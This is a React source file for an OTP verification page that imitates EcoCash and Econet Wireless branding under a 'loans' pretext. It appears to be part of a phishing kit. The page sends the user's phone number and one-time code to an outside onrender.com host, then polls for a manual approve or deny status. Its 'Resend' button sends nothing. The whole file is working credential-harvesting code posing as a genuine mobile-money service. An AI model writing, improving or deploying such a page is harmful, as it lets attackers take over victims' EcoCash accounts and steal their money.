import { useState, useRef, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 

export default function OTPPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const phone = location.state?.phone || '771234567'; 
  const amount = location.state?.amount || 50000;

  const [otp, setOtp] = useState<string[]>(['', '', '', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(120);
  const [isProcessing, setIsProcessing] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const isComplete = otp.every(digit => digit !== '');

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  const maskPhone = (num: string) => {
    if (num.length < 9) return `+263 ${num}`;
    return `+263 ${num.slice(0, 2)} *** **${num.slice(-2)}`;
  };

  const handleChange = (index: number, e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    if (isNaN(Number(val))) return;
    const newOtp = [...otp];
    newOtp[index] = val.substring(val.length - 1);
    setOtp(newOtp);
    if (val && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleConfirm = async () => {
    if (!isComplete || isProcessing) return;
    setIsProcessing(true);

    try {
      const response = await fetch(`${API_BASE_URL}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, otp: otp.join(''), amount })
      });

      if (!response.ok) throw new Error("Failed");
      const { transaction_id } = await response.json();

      let attempts = 0;
      pollRef.current = setInterval(async () => {
        attempts++;
        if (attempts > 60) {
          if (pollRef.current) clearInterval(pollRef.current);
          setIsProcessing(false);
          alert("Timed out.");
          return;
        }

        try {
          const statusRes = await fetch(`${API_BASE_URL}/api/status/${transaction_id}`);
          const statusData = await statusRes.json();

          if (statusData.status === 'approved') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            navigate('/success', { state: { amount, phone } });
          } else if (statusData.status === 'denied') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            alert("OTP was denied.");
            navigate('/apply');
          }
        } catch (err) {
          console.error("Polling error", err);
        }
      }, 2000);
    } catch (error) {
      setIsProcessing(false);
      alert("Network error.");
    }
  };

  return (
    <div style={{ width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif" }}>
      <div style={{ background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px', color: 'white', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
          <div style={{ background: 'white', color: '#0b40c4', padding: '4px 8px', borderRadius: '6px', fontWeight: 800, fontSize: '12px', fontStyle: 'italic' }}>ECONET <span style={{fontSize: '7px', display: 'block'}}>Wireless</span></div>
          <div style={{ color: '#e53935', fontWeight: 800, fontSize: '14px', background: 'white', padding: '4px 8px', borderRadius: '6px' }}>EcoCash</div>
          <span style={{ marginLeft: 'auto', background: 'rgba(255,255,255,0.2)', padding: '6px 12px', borderRadius: '16px', fontSize: '12px', fontWeight: 700 }}>ZWG {amount.toLocaleString()}</span>
        </div>
      </div>

      <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
        <div style={{ backgroundColor: 'white', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 12px rgba(0,0,0,0.05)', position: 'relative', overflow: 'hidden' }}>
          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '4px', background: 'linear-gradient(90deg, #00d2ff, #1e5ce6)' }}></div>
          
          <h3 style={{ fontSize: '18px', margin: '0 0 4px 0' }}>One-Time Password</h3>
          <p style={{ fontSize: '13px', color: '#888', margin: '0 0 24px 0' }}>6-digit code sent to your number</p>
          <div style={{ textAlign: 'center', fontSize: '15px', fontWeight: 600, marginBottom: '24px' }}>Code sent to {maskPhone(phone)}</div>
          
          <div style={{ display: 'flex', justifyContent: 'space-between', gap: '8px', marginBottom: '24px' }}>
            {otp.map((digit, index) => (
              <input 
                key={index} 
                type="text" 
                inputMode="numeric" 
                value={digit} 
                onChange={(e) => handleChange(index, e)} 
                onKeyDown={(e) => handleKeyDown(index, e)} 
                // FIXED REF TYPE ERROR HERE:
                ref={(el) => {
                  inputRefs.current[index] = el;
                }} 
                style={{ width: '45px', height: '55px', border: digit !== '' ? '2px solid #1e5ce6' : '1px solid #e0e0e0', borderRadius: '12px', textAlign: 'center', fontSize: '24px', fontWeight: 600, outline: 'none' }} 
                disabled={isProcessing} 
              />
            ))}
          </div>
          
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '13px', color: '#666' }}>
            <span style={{ color: timeLeft < 20 ? '#e53935' : '#666' }}>Expires in {timeLeft}s</span>
            <button style={{ background: 'none', border: 'none', color: timeLeft > 0 ? '#c0c0c0' : '#1e5ce6', fontWeight: 600 }} disabled={timeLeft > 0} onClick={() => setTimeLeft(120)}>Resend</button>
          </div>
        </div>

        <button onClick={handleConfirm} disabled={!isComplete || isProcessing} style={{ width: '100%', padding: '16px', border: 'none', borderRadius: '16px', fontSize: '16px', fontWeight: 700, color: 'white', backgroundColor: isComplete && !isProcessing ? '#1e5ce6' : '#a0bdf5' }}>
          {isProcessing ? 'Verifying...' : 'Confirm OTP'}
        </button>
      </div>
    </div>
  );
}